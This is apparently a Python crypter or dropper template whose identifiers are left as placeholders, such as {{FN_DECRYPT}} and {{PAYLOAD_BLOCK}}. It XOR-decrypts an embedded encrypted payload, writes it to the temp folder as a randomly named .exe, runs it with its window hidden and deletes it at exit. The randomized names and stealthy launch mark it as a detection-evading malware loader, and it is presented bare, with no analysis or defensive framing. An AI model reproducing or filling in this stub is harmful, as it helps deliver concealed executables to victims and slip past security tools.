#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, os, time, base64, subprocess, tempfile, atexit
{{PRE_CHECKS}}
# === Encrypted Payload ===
{{V_KEY}} = base64.b64decode("{{XOR_KEY_B64}}")
{{PAYLOAD_BLOCK}}

def {{FN_DECRYPT}}(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def {{FN_EXECUTE}}():
    {{V_BUF}} = {{FN_DECRYPT}}({{V_ENC}}, {{V_KEY}})

    {{V_TMP}} = os.path.join(tempfile.gettempdir(), "{{RAND_FILENAME}}.exe")
    with open({{V_TMP}}, "wb") as f:
        f.write({{V_BUF}})

    def _cleanup():
        try: os.remove({{V_TMP}})
        except: pass
    atexit.register(_cleanup)

    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    subprocess.Popen({{V_TMP}}, startupinfo=si, close_fds=True)

if __name__ == "__main__":
    {{FN_EXECUTE}}()
